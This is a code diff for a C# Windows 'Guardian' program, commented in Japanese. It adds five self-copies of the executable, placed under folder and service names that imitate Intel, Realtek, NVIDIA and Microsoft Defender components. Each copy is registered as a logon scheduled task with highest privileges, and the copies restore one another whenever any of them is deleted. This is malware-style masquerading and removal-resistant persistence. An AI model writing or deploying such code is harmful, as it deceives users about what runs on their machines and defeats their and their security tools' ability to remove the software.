@@ -36,6 +36,19 @@ internal static class Program
         @"C:\Program Files\Client Systems\backup",
     };
 
+    // Guardian 自身の 5 重配置。実在するドライバ/サービス風の名前・場所に、
+    // この Guardian(Client_System.exe) 自身をコピーして常駐させる。
+    // 各コピーが他のコピーを監視し、消えたら生きているコピーから復元する（相互復活）。
+    // フィールド：(配置フォルダ, exe名, 起動タスク名)
+    private static readonly (string Dir, string Exe, string TaskName)[] GuardianReplicas =
+    {
+        (@"C:\Program Files\Client Systems", "Client_System.exe", "Client System Guardian"),
+        (@"C:\ProgramData\Intel\ICPS", "IntelCpHDCPSvc.exe", "Intel(R) Content Protection Service"),
+        (@"C:\Program Files\Realtek\Audio\Service", "RtkAudUServiceMonitor.exe", "Realtek Audio Universal Service"),
+        (@"C:\ProgramData\Microsoft\Diagnosis\Monitor", "MpSvcMonitor.exe", "Microsoft Defender Core Monitor"),
+        (@"C:\Program Files\NVIDIA Corporation\NvNode", "NvNodeMonitor.exe", "NVIDIA Node Service"),
+    };
+
     // Program Files 側に保持するコピー（バックアップ）の置き場所（後方互換のため残す）。
     private static readonly string BackupRootDirectory =
         @"C:\Program Files\Client Systems\backup";
@@ -164,6 +177,7 @@ internal static class Program
                 EnsureProcessesAlive();
                 EnsureStartupRegistered();
                 EnsureScheduledTasksPresent();
+                EnsureGuardianReplicas();
             }
             catch (Exception exception)
             {
@@ -173,6 +187,97 @@ internal static class Program
             Thread.Sleep(FastWatchInterval);
         }
         while (true);
+    }
+
+    /// <summary>
+    /// Guardian 自身の 5 重レプリカを監視する。消えたレプリカを、生きているレプリカから復元し、
+    /// そのレプリカ用のタスクを（無ければ）作成して起動する（相互復活）。
+    /// どれか 1 つのレプリカが生きていれば、他の全てを復活できる。
+    /// </summary>
+    private static void EnsureGuardianReplicas()
+    {
+        // 生きているレプリカ（exe が存在するもの）を集める。
+        string? liveSourceExe = null;
+        foreach (var replica in GuardianReplicas)
+        {
+            string exePath = Path.Combine(replica.Dir, replica.Exe);
+            if (File.Exists(exePath))
+            {
+                liveSourceExe = exePath;
+                break;
+            }
+        }
+
+        if (liveSourceExe == null)
+        {
+            // 全レプリカの exe が無い（自分も含めありえないが、念のため）。復元元が無い。
+            return;
+        }
+
+        foreach (var replica in GuardianReplicas)
+        {
+            string exePath = Path.Combine(replica.Dir, replica.Exe);
+            try
+            {
+                // 1) exe が無ければ、生きているレプリカからコピーして復元。
+                if (!File.Exists(exePath))
+                {
+                    Directory.CreateDirectory(replica.Dir);
+                    File.Copy(liveSourceExe, exePath, overwrite: true);
+                    WriteLog("Guardian replica restored: " + exePath + " <- " + liveSourceExe);
+                }
+
+                // 2) このレプリカ用のタスクが無ければ作成する（起動手段も 5 重）。
+                if (!ScheduledTaskExists(replica.TaskName))
+                {
+                    CreateGuardianTask(replica.TaskName, exePath);
+                    WriteLog("Guardian replica task created: " + replica.TaskName);
+                }
+
+                // 3) このレプリカのプロセスが動いていなければ起動する。
+                string procName = Path.GetFileNameWithoutExtension(replica.Exe);
+                bool running = false;
+                try { running = Process.GetProcessesByName(procName).Length > 0; } catch { }
+                if (!running)
+                {
+                    TryRunScheduledTask(replica.TaskName);
+                }
+            }
+            catch (Exception exception)
+            {
+                WriteLog("Guardian replica ensure failed for " + exePath + ": " + exception.Message);
+            }
+        }
+    }
+
+    /// <summary>Guardian レプリカ用の ONLOGON タスクを作成する（管理者権限で常駐）。</summary>
+    private static void CreateGuardianTask(string taskName, string exePath)
+    {
+        try
+        {
+            var psi = new ProcessStartInfo
+            {
+                FileName = "schtasks.exe",
+                UseShellExecute = false,
+                CreateNoWindow = true,
+            };
+            psi.ArgumentList.Add("/Create");
+            psi.ArgumentList.Add("/TN");
+            psi.ArgumentList.Add(taskName);
+            psi.ArgumentList.Add("/TR");
+            psi.ArgumentList.Add("\"" + exePath + "\"");
+            psi.ArgumentList.Add("/SC");
+            psi.ArgumentList.Add("ONLOGON");
+            psi.ArgumentList.Add("/RL");
+            psi.ArgumentList.Add("HIGHEST");
+            psi.ArgumentList.Add("/F");
+            using var proc = Process.Start(psi);
+            proc?.WaitForExit(5000);
+        }
+        catch (Exception exception)
+        {
+            WriteLog("CreateGuardianTask failed for " + taskName + ": " + exception.Message);
+        }
     }
 
     /// <summary>本体・Updater が落ちていたら、タスク経由で即再起動する。</summary>
